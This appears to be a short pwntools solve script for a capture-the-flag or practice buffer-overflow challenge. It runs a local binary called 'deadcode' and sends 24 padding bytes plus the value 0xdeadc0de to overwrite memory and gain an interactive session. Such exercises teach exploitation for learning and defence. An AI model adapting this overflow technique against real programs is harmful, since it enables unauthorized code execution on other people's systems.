from pwn import*

p = process('./deadcode')

payload = b'\x00'*24 + p64(0xdeadc0de)

p.sendline(payload)
p.interactive()
